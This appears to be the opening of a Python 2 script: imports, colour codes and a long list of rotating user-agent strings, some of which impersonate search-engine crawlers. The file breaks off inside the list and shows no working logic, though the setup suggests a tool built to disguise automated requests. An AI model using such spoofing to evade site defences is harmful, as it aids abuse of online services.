#*-coding:utf-8-*
import os, sys, re, time, json, requests, random, datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from time import sleep
reload(sys)
sys.setdefaultencoding("utf-8")

"""
Don't try to copy
Understand ?
"""

# Color
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
R = ('\033[1;31m')
G = ('\033[1;32m')
Y = ('\033[1;33m')
P = ('\033[1;34m')
B = ('\033[1;35m')
C = ('\033[1;36m')


# Useragent
agents =  [
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
  "Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
  "MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
